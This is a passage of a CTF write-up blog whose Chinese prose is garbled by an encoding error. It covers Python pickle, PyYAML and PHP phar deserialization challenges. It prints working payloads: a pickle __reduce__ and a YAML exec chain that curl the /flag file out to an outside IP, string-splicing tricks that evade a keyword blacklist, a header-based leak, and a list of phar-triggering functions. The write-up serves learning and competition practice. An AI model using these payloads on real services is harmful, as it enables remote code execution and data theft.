class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">True</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„é»‘åå•æ²¡æœ‰è¿‡æ»¤importå’Œsubprocessï¼Œç›´æ¥å†™ä¸ªå¸¸è§„çš„reduceå‡½æ•°ç”¨curlå¤–å¸¦ä¸€ä¸‹flagå³å¯ï¼Œä¸€å¼€å§‹ç”¨opcodeä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰“ä¸é€šï¼Œè¿™æ˜¯é˜Ÿå‹çš„exp</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        self.username = username<br>        self.password = password<br>        self.auth = auth<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        host = <span class="hljs-string">&#x27;&lt;ipåœ°å€&gt;&#x27;</span><br>        port = <span class="hljs-number">8888</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).run, ([<br>            <span class="hljs-string">&#x27;curl&#x27;</span>,<br>            <span class="hljs-string">&#x27;-d&#x27;</span>,<br>            <span class="hljs-string">&#x27;@/flag&#x27;</span>,<br>            <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>/test&#x27;</span><br>        ],)<br><br>user = User(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>)<br>data = pickle.dumps(user)<br><span class="hljs-built_in">print</span>(data)<br>data = base64.b64encode(data)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241221184713683.png" alt="image-20241221184713683"></p><p><img src="https://cdn.clown2024.cn/image-20241221184804688.png" alt="image-20241221184804688"></p><h2 id="å®˜æ–¹è§£æ³•"><a href="#å®˜æ–¹è§£æ³•" class="headerlink" title="å®˜æ–¹è§£æ³•"></a>å®˜æ–¹è§£æ³•</h2><p>åæ¥çœ‹å®˜æ–¹wpï¼Œä¸Šé¢çš„è§£æ³•æ˜¯å‡ºé¢˜çš„æ—¶å€™æ²¡è¿‡æ»¤å¹²å‡€ï¼Œå¯¼è‡´éé¢„æœŸï¼Œå®˜æ–¹çš„æ˜¯ä¿®æ”¹å¸¸é‡å­—èŠ‚ç ï¼Œç¬¬ä¸€æ¬¡è§ï¼Œå­¦ä¹ ä¸€ä¸‹</p><p>æ€»ç»“ä¸€ä¸‹æ€è·¯ï¼Œå°±æ˜¯å…ˆå†™ä¸€ä¸ªè¯»æ–‡ä»¶çš„å‡½æ•°ï¼Œç„¶åè·å–ä»–çš„ä»£ç å¯¹è±¡ï¼Œç„¶åä¿®æ”¹ä»£ç å¯¹è±¡ä¸­çš„å¸¸é‡å±æ€§ï¼Œç”¨types.CodeTypeæ„å»ºæ–°çš„ä»£ç å¯¹è±¡ï¼Œç„¶åè°ƒç”¨æ–°çš„å‡½æ•°ï¼Œè¾¾åˆ°ä¿®æ”¹è¿”å›æ–‡ä»¶å†…å®¹çš„æ•ˆæœ</p><p>å¤§è‡´çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> types<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><span class="hljs-comment"># print(src.__code__.__dir__()) #æŸ¥çœ‹ä»£ç å¯¹è±¡æ‰€æœ‰å±æ€§</span><br><span class="hljs-comment"># print(src.__code__.co_consts)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> src.__code__.__dir__():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> : <span class="hljs-subst">&#123;<span class="hljs-built_in">getattr</span>(src.__code__, i)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># è·å–æ‰€æœ‰ä»£ç å¯¹è±¡çš„å±æ€§ï¼Œä¸€ä¸ªä¸ªèµ‹å€¼ç»™æ–°å¯¹è±¡ï¼Œåªæ”¹å˜å…¶ä¸­çš„å¸¸é‡</span><br>g1 = builtins.<span class="hljs-built_in">getattr</span><br>g2 = <span class="hljs-built_in">getattr</span>(src,<span class="hljs-string">&quot;__code__&quot;</span>)<br>g3 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_argcount&quot;</span>)<br>g4 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_posonlyargcount&quot;</span>)<br>g5 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_kwonlyargcount&quot;</span>)<br>g6 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_nlocals&quot;</span>)<br>g7 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_stacksize&quot;</span>)<br>g8 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_flags&quot;</span>)<br>g9 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_code&quot;</span>)<br>g10 = (<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>, (<span class="hljs-string">&#x27;encoding&#x27;</span>,)) <span class="hljs-comment">#g10 = getattr(g2,&quot;co_consts&quot;) # è®¾ç½®æ–°å¸¸é‡ï¼Œsrcçš„å¸¸é‡ä¸ºï¼š(None, &#x27;app.py&#x27;, &#x27;r&#x27;, &#x27;utf-8&#x27;, (&#x27;encoding&#x27;,))</span><br>g11 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_names&quot;</span>)<br>g12 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_varnames&quot;</span>)<br>g13 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_filename&quot;</span>)<br>g14 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_name&quot;</span>)<br>g15 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_firstlineno&quot;</span>)<br><span class="hljs-comment"># print(&quot;[*]========&quot;,type(g15))</span><br><span class="hljs-comment"># print(&quot;[*]========&quot;,g15)</span><br>g16 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_lnotab&quot;</span>)<br>g17 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_freevars&quot;</span>)<br>g18 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_cellvars&quot;</span>)<br><br>g19 = types.CodeType(g3,g4,g5,g6,g7,g8,g9,g10,g11,g12,g13,g14,g15,g16,g17,g18) <span class="hljs-comment"># ç”Ÿæˆæ–°ä»£ç å¯¹è±¡</span><br>g20 = builtins.<span class="hljs-built_in">setattr</span><br>g20(src,<span class="hljs-string">&quot;__code__&quot;</span>,g19)<br><span class="hljs-built_in">print</span>(src())<br><br><span class="hljs-comment"># ç„¶åå°±æ˜¯å°†ä¸Šé¢çš„ä»£ç æ”¹æˆopcodeå³å¯ï¼Œæ•´ä¸ªæ€è·¯å°±æ˜¯å…ˆå†™ä¸€ä¸ªè¯»æ–‡ä»¶çš„å‡½æ•°ï¼Œç„¶åä¿®æ”¹è¯¥å‡½æ•°ä»£ç å¯¹è±¡çš„å¸¸é‡ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ä»£ç å¯¹è±¡ï¼Œè®©å…¶è¯»flag</span><br></code></pre></td></tr></table></figure><p>ä½†ä¸Šé¢çš„å‚æ•°ä½ç½®å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œä¹Ÿè®¸æ˜¯æˆ‘çš„pythonç‰ˆæœ¬å’Œwpé‡Œçš„ä¸å¤ªä¸€æ ·ï¼Œè¿™é‡Œå°±æ‡’å¾—è°ƒäº†ï¼Œå­¦ä¹ ä¸€ä¸‹æ€è·¯</p><p>ç„¶åå°±æ˜¯æ„å»ºopcode</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">op3 = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">c__main__</span><br><span class="hljs-string">src</span><br><span class="hljs-string">p3</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;__code__&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp6</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_kwonlyargcount&#x27;</span><br><span class="hljs-string">tRp7</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_nlocals&#x27;</span><br><span class="hljs-string">tRp8</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_stacksize&#x27;</span><br><span class="hljs-string">tRp9</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_flags&#x27;</span><br><span class="hljs-string">tRp10</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_code&#x27;</span><br><span class="hljs-string">tRp11</span><br><span class="hljs-string">(NS&#x27;/flag&#x27;</span><br><span class="hljs-string">S&#x27;r&#x27;</span><br><span class="hljs-string">S&#x27;utf-8&#x27;</span><br><span class="hljs-string">(S&#x27;encoding&#x27;</span><br><span class="hljs-string">ttp12</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_names&#x27;</span><br><span class="hljs-string">tRp13</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_varnames&#x27;</span><br><span class="hljs-string">tRp14</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_filename&#x27;</span><br><span class="hljs-string">tRp15</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_name&#x27;</span><br><span class="hljs-string">tRp16</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_firstlineno&#x27;</span><br><span class="hljs-string">tRp17</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_lnotab&#x27;</span><br><span class="hljs-string">tRp18</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_freevars&#x27;</span><br><span class="hljs-string">tRp19</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_cellvars&#x27;</span><br><span class="hljs-string">tRp20</span><br><span class="hljs-string">ctypes</span><br><span class="hljs-string">CodeType</span><br><span class="hljs-string">(g5</span><br><span class="hljs-string">I0</span><br><span class="hljs-string">g7</span><br><span class="hljs-string">g8</span><br><span class="hljs-string">g9</span><br><span class="hljs-string">g10</span><br><span class="hljs-string">g11</span><br><span class="hljs-string">g12</span><br><span class="hljs-string">g13</span><br><span class="hljs-string">g14</span><br><span class="hljs-string">g15</span><br><span class="hljs-string">g16</span><br><span class="hljs-string">g17</span><br><span class="hljs-string">g18</span><br><span class="hljs-string">g19</span><br><span class="hljs-string">g20</span><br><span class="hljs-string">tRp21</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">setattr</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&quot;__code__&quot;</span><br><span class="hljs-string">g21</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è·å–<code>builtins</code>çš„getattræ–¹æ³•,é€šè¿‡getattrè·å–åˆ°srcçš„<code>__code__</code>,ç»§è€Œè·å¾—<code>co_const</code>ç­‰å‚æ•°,è·å–<code>builtins</code>çš„setattr,ä¿®æ”¹<code>__code__</code>ä¸ºæ–°çš„CodeTypeï¼ˆç€å®ä¸å¤ªä¼šå†™è¿™ä¹ˆé•¿çš„opcodeğŸ˜­ï¼‰</p><h1 id="yaml_matser"><a href="#yaml-matser" class="headerlink" title="yaml_matser"></a>yaml_matser</h1><p>è¿™ä¸ªæ‰¾åˆ°æ–‡ç« ï¼Œæœ‰payloadæ˜¯æ²¡æœ‰è¿‡æ»¤çš„å¯ä»¥ç›´æ¥æ‰“ï¼š<a href="https://www.freebuf.com/vuls/256243.html,https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW=i=mER87o=oD">https://www.freebuf.com/vuls/256243.html,https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW%3Di%3DmER87o%3DoD</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#åˆ›å»ºäº†ä¸€ä¸ªç±»å‹ä¸ºzçš„æ–°å¯¹è±¡,è€Œå¯¹è±¡ä¸­extendå±æ€§åœ¨åˆ›å»ºæ—¶ä¼šè¢«è°ƒç”¨,å‚æ•°ä¸ºlistitemså†…çš„å‚æ•°<br>!!python/object/new:type<br>  args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;]<br>  listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨pythonçš„å¼•å·ç›´æ¥æ‹¼æ¥ï¼Œå†å¥—ä¸€å±‚execå³å¯</p><p>é‡Œé¢å‚æ•°æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆè¿™æ ·å½¢å¼æ‹¼æ¥å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">exec(\&quot;__import__(&#x27;o&#x27;&#x27;s&#x27;).sys\&quot;\&quot;tem(&#x27;ca&#x27;&#x27;lc&#x27;)\&quot;)<br></code></pre></td></tr></table></figure><p>ç„¶åä»–èƒ½å‡ºç½‘ï¼Œå¯ä»¥ç”¨æ‹¼æ¥ç»•è¿‡curlï¼Œæœ€ç»ˆexpå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">!!python/object/new:type<br>  args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;]<br>  listitems: &quot;exec(\&quot;__import__(&#x27;o&#x27;&#x27;s&#x27;).sys\&quot;\&quot;tem(&#x27;cu&#x27;&#x27;rl http://&lt;ipåœ°å€&gt;:8888 -d `cat /flag`&#x27;)\&quot;)&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250209211435738.png" alt="image-20250209211435738"></p><h2 id="å®˜æ–¹è§£æ³•"><a href="#å®˜æ–¹è§£æ³•-1" class="headerlink" title="å®˜æ–¹è§£æ³•"></a>å®˜æ–¹è§£æ³•</h2><p>è¿™é‡Œå­¦åˆ°å®˜æ–¹çš„ä¸€ä¸ªå›æ˜¾æŠ€å·§ï¼Œé€šè¿‡Serverè¯·æ±‚å¤´å¸¦å‡ºæ•°æ®</p><p>werkzeug.serving.WSGIRequestHandlerè¿™ä¸ªå¤„ç†å™¨æ˜¯ç”¨æ¥å¤„ç†è¯·æ±‚å¤´çš„</p><p>Serverå¤´çš„å€¼æ˜¯server_versionå±æ€§å’Œsys_versionå±æ€§æ‹¼æ¥åœ¨ä¸€èµ·çš„</p><p>é‚£æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•ä¿®æ”¹server_versionå±æ€§æˆ–è€…sys_versionå±æ€§å³å¯å¸¦å‡ºæ•°æ®äº†</p><p>ç”¨setattrå°±å¯ä»¥æ”¹äº†ï¼Œå®Œæ•´yamlå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>        args:<br>         - exp<br>         - !!python/<span class="hljs-built_in">tuple</span> []<br>         - &#123;<span class="hljs-string">&quot;extend&quot;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;<br>        listitems: |<br>         bb=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read()<br>         <span class="hljs-keyword">import</span> werkzeug<br>         <span class="hljs-built_in">setattr</span>(werkzeug.serving.WSGIRequestHandler, <span class="hljs-string">&quot;server_version&quot;</span>,bb )<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250209210050744.png" alt="image-20250209210050744"></p><h1 id="strange_php"><a href="#strange-php" class="headerlink" title="strange_php"></a>strange_php</h1><p>ä¸€ä¸ªphpå†™çš„ç•™è¨€æ¿åº”ç”¨ï¼Œéœ€è¦æˆ‘ä»¬è¿›è¡Œä»£ç å®¡è®¡ï¼Œä½†æ˜¯å¾ˆå¤šåœ°æ–¹çš„åç¼€éƒ½æ˜¯å†™æ­»çš„ï¼Œåªæœ‰ä¸€ä¸ªåœ°æ–¹çš„æ–‡ä»¶è·¯å¾„æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„</p><p>å°±åœ¨welcome.phpçš„deleteæ¨¡å—çš„åœ°æ–¹</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PDO_connect.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;User.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span>  <span class="hljs-string">&#x27;UserMessage.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>   <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.html&quot;</span>);<br>   <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$Message</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserMessage</span>();<br><br><br><span class="hljs-variable">$userMessage</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserMessage</span>();<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PDO_connect</span>();<br><span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">init</span>();<br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_connection</span>();<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$action</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$action</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$action</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;message&#x27;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;write messageing&quot;</span>;<br>            <span class="hljs-variable">$decodedMessage</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;encodedMessage&#x27;</span>]);<br>            <br>            <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">writeMessage</span>(<span class="hljs-variable">$decodedMessage</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>===<span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å†™å…¥å¤±è´¥&quot;</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-variable">$filePath</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">get_filePath</span>();<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>] = <span class="hljs-variable">$filePath</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç•™è¨€å·²å†™å…¥: &quot;</span>. <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">get_filePath</span>();<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;editMessage&#x27;</span>:<br>                <span class="hljs-variable">$decodedEditMessage</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;encodedEditMessage&#x27;</span>]);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">editMessage</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>],<span class="hljs-variable">$decodedEditMessage</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç•™è¨€å·²æˆåŠŸæ›´æ”¹&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ“ä½œå¤±è´¥ï¼Œè¯·é‡æ–°å°è¯•&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;delete&#x27;</span>:<br>            <span class="hljs-variable">$message</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>]?<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>]:<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>];<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">deleteMessage</span>(<span class="hljs-variable">$message</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç•™è¨€å·²æˆåŠŸåˆ é™¤&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ“ä½œå¤±è´¥ï¼Œè¯·é‡æ–°å°è¯•&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;clean&#x27;</span>:<br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;rm log/*&#x27;</span>);<br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;rm txt/*&#x27;</span>);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨deleteMessageæ–¹æ³•ä¼ å…¥æˆ‘ä»¬è¦åˆ é™¤çš„æ–‡ä»¶è·¯å¾„</p><p><img src="https://cdn.clown2024.cn/image-20241225223721578.png" alt="image-20241225223721578"></p><h2 id="pharååºåˆ—åŒ–çš„è§¦å‘"><a href="#pharååºåˆ—åŒ–çš„è§¦å‘" class="headerlink" title="pharååºåˆ—åŒ–çš„è§¦å‘"></a>pharååºåˆ—åŒ–çš„è§¦å‘</h2><p>ç„¶åè¿™é‡Œè°ƒç”¨äº†file_exists()å‡½æ•°åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œä¸€å¼€å§‹å®¡åˆ°è¿™é‡Œæˆ‘æ˜¯ä¸çŸ¥é“è¿™èƒ½è§¦å‘pharååºåˆ—åŒ–çš„ï¼Œåœ¨é˜Ÿå‹æé†’ä¸‹æ‰çŸ¥é“ğŸ¥²ï¼Œç„¶åæ‰¾äº†æ‰¾ï¼Œè¿™ç¯‡æ–‡ç« æœ‰ä»‹ç»èƒ½å¤Ÿè§¦å‘pharçš„å‡½æ•°ï¼š<a href="https://blog.csdn.net/weixin_53912233/article/details/136201466">https://blog.csdn.net/weixin_53912233/article/details/136201466</a></p><p>è¿™é‡Œä¹Ÿè®°å½•ä¸€ä¸‹èƒ½å¤Ÿè§¦å‘pharååºåˆ—åŒ–çš„æ–¹æ³•</p><p>ä¸€äº›è§¦å‘pharçš„æ•æ„Ÿå‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fileatime / filectime / filemtime<br>stat / fileinode / fileowner / filegroup / fileperms<br>file / file_get_contents / readfile / fopen<br>file_exists / is_dir / is_executable / is_file <br>is_link / is_readable / is_writeable / is_writable<br>parse_ini_file<br>unlink<br>copy<br></code></pre></td></tr></table></figure><p>å…¶ä»–è§¦å‘å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">image<br>    exif_thumbnail<br>    exif_imagetype<br>    imageloadfont<br>    imagecreatefrom***<br>    getimagesize<br>    getimagesizefromstring<br>hash<br>    hash_hmac_file<br>    hash_file<br>    hash_update_file<br>    md5_file<br>    sha1_file<br>file / url<br>    get_meta_tags<br>    get_headers<br><br></code></pre></td></tr></table></figure><h2 id="å¯»æ‰¾ååºåˆ—åŒ–çš„ç‚¹"><a href="#å¯»æ‰¾ååºåˆ—åŒ–çš„ç‚¹" class="headerlink" title="å¯»æ‰¾ååºåˆ—åŒ–çš„ç‚¹"></a>å¯»æ‰¾ååºåˆ—åŒ–çš„ç‚¹</h2><p>ç„¶åå°±æ˜¯æ‰¾è¦è§¦å‘ä»€ä¹ˆé“¾å­äº†ï¼Œä½†æ˜¯å…¨æ–‡å°±ä¸€ä¸ª_seté­”æœ¯æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserMessage</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$filePath</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filePath = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">generateFileName</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeMessage</span>(<span class="hljs-params"><span class="hljs-variable">$message</span></span>) </span>&#123;<br><br><br>        <span class="hljs-comment">// å†™å…¥ç•™è¨€åˆ°æ–‡ä»¶ä¸­</span><br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath, <span class="hljs-variable">$message</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editMessage</span>(<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$newMessage</span></span>) </span>&#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$newMessage</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span 